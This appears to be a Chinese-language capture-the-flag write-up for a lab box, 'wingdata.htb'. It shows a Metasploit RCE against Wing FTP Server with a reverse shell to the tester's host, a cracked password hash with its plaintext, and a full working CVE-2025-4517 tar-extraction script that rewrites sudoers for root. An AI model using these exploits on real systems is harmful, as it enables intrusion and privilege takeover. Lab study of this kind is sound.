# 信息收集

端口扫描

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.5.53 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 04:14 EDT
Nmap scan report for 10.129.5.53
Host is up (0.34s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.71 seconds
```

# 漏洞利用

先看一下80端口

```aiignore
┌──(kali㉿kali)-[~]
└─$ curl -i 10.129.5.53               
HTTP/1.1 301 Moved Permanently
Date: Mon, 25 May 2026 08:18:30 GMT
Server: Apache/2.4.66 (Debian)
Location: http://wingdata.htb/
Content-Length: 345
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://wingdata.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.66 (Debian) Server at 10.129.5.53 Port 80</address>
</body></html>
```

添加一下hosts

```aiignore
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/10.129.5.53/d' /etc/hosts && echo "10.129.5.53 wingdata.htb" | sudo tee -a /etc/hosts
10.129.5.53 wingdata.htb
```

子域名枚举

```aiignore
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://wingdata.htb -H "Host: FUZZ.wingdata.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,302,403,401 -s
ftp
```

目录枚举

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://wingdata.htb/ 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wingdata.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 317]
.htaccess            (Status: 403) [Size: 317]
.htpasswd            (Status: 403) [Size: 317]
assets               (Status: 301) [Size: 353] [--> http://wingdata.htb/assets/]                                        
index.html           (Status: 200) [Size: 12492]
server-status        (Status: 403) [Size: 317]
vendor               (Status: 301) [Size: 353] [--> http://wingdata.htb/vendor/]                                        
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

在添加一下hosts

```aiignore
┌──(kali㉿kali)-[~]
└─$ echo "10.129.5.53 ftp.wingdata.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.5.53 ftp.wingdata.htb
```

ftp.wingdata.htb下是一个登录页面：FTP server software powered by Wing FTP Server v7.4.3。找一下漏洞

```aiignore
msf exploit(multi/http/wingftp_null_byte_rce) > set RHOSTS 10.129.5.53
RHOSTS => 10.129.5.53
msf exploit(multi/http/wingftp_null_byte_rce) > set VHOST ftp.wingdata.htb
VHOST => ftp.wingdata.htb
msf exploit(multi/http/wingftp_null_byte_rce) > set LHOST 10.10.16.166
LHOST => 10.10.16.166
msf exploit(multi/http/wingftp_null_byte_rce) > set FETCH_WRITABLE_DIR /tmp
FETCH_WRITABLE_DIR => /tmp
msf exploit(multi/http/wingftp_null_byte_rce) > run
[*] Started reverse TCP handler on 10.10.16.166:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected version 7.4.3 ≤ 7.4.4
[+] Received UID: UID=304e6a7cd5ff750cd4f25bd624ff1638f528764d624db129b32c21fbca0cb8d6; path=, injection succeeded
[*] Sending stage (3090404 bytes) to 10.129.5.53
[*] Meterpreter session 1 opened (10.10.16.166:4444 -> 10.129.5.53:36670) at 2026-05-25 07:39:29 -0400

meterpreter >
```

# 权限提升

```aiignore
//上传linpeas，看看有没有什么信息
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
cat wacky.xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
//破解一下hash
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-10875H CPU @ 2.30GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.                                            
If you want to switch to optimized kernels, append -O to your commandline.                                              
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Initializing backend runtime for device #1. Please be patienHost memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Mon May 25 08:14:07 2026 (3 secs)
Time.Estimated...: Mon May 25 08:14:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3864.3 kH/s (0.24ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344385 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14340096/14344385 (99.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: !carolyn ->  ladykitz
Hardware.Mon.#1..: Util: 29%

Started: Mon May 25 08:13:54 2026
Stopped: Mon May 25 08:14:12 2026
┌──(kali㉿kali)-[~]
└─$ ssh wacky@10.129.5.53        
The authenticity of host '10.129.5.53 (10.129.5.53)' can't be established.
ED25519 key fingerprint is SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.5.53' (ED25519) to the list of known hosts.
wacky@10.129.5.53's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 25 08:15:57 2026 from 10.10.16.166
wacky@wingdata:~$ id
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
//看一下脚本
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
//tar.extractall(path=staging_dir, filter="data")，存在CVE-2025-4517
//利用脚本生成一个恶意文件
import tarfile
import os
import io
import sys

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        
        path = os.path.join(path, comp)
    
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)
    
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)
    
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)
    
    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Exploit created")
wacky@wingdata:~$ python3 1.py 
[+] Exploit created
wacky@wingdata:~$ cp /tmp/backup_9999.tar /opt/backup_clients/backups/
wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
wacky@wingdata:~$ sudo -l
User wacky may run the following commands on wingdata:
    (ALL) NOPASSWD: ALL

```